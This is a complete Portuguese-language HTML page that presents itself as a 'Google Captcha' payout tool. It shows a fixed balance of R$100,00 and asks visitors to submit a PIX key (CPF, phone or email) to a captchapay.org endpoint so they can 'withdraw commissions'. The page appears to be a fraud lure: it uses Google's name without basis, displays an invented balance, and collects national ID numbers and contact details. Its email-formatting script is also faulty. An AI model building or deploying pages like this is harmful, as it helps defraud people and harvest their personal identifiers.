<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Captchas - Nova Ferramenta</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            position: relative;
        }
        .saldo {
            background-color: #4caf50;
            color: white;
            padding: 10px;
            text-align: center;
            margin-top: 20px;
            border-radius: 5px;
            font-size: 1.5em;
        }
        .content {
            margin: 20px 0;
        }
        .btn {
            display: block;
            width: 100%;
            padding: 15px;
            text-align: center;
            border: none;
            border-radius: 5px;
            font-size: 1.2em;
            cursor: pointer;
            margin-top: 20px;
            background-color: #4caf50;
            color: white;
        }
        .error {
            color: red;
            text-align: center;
            margin-top: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="saldo">Saldo: R$100,00</div>
        <div class="content">
            <h2 style="font-size: 21px;">Realize seu Saque</h2>
            <p>Insira sua chave PIX abaixo para sacar suas comissões das tarefas concluídas do Google Captcha.</p>
        </div>
        <form id="pixForm" action="https://api.captchapay.org/captcha/process_pix.php" method="POST">
            <div class="form-group">
                <label for="pixType">Tipo de Chave Pix</label>
                <select id="pixType" name="pixType" required>
                    <option value="cpf">CPF</option>
                    <option value="phoneNumber">Celular</option>
                    <option value="email">Email</option>
                </select>
            </div>
            <div class="form-group">
                <label for="pixKey">Chave Pix</label>
                <input type="text" id="pixKey" name="pixKey" required>
            </div>
            <button type="submit" class="btn">Enviar</button>
        </form>
        <div class="error" id="pixErrorMessage"></div>
    </div>

    <script>
        document.getElementById('pixType').addEventListener('change', function() {
            const pixKeyInput = document.getElementById('pixKey');
            pixKeyInput.value = '';
        });

        document.getElementById('pixKey').addEventListener('input', function() {
            const pixType = document.getElementById('pixType').value;
            const pixKeyInput = document.getElementById('pixKey');
            let value = pixKeyInput.value;

            if (pixType === 'cpf') {
                value = value.replace(/\D/g, ''); // Remove tudo que não é dígito
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                pixKeyInput.value = value;
            } else if (pixType === 'phoneNumber') {
                value = value.replace(/\D/g, ''); // Remove tudo que não é dígito
                value = value.replace(/(\d{2})(\d)/, '($1) $2');
                value = value.replace(/(\d{5})(\d)/, '$1-$2');
                pixKeyInput.value = value;
            } else if (pixType === 'email') {
                // Add basic email format correction
                if (!value.includes('@')) {
                    pixKeyInput.value = value + '@exemplo.com';
                }
            }
        });
    </script>
</body>
</html>
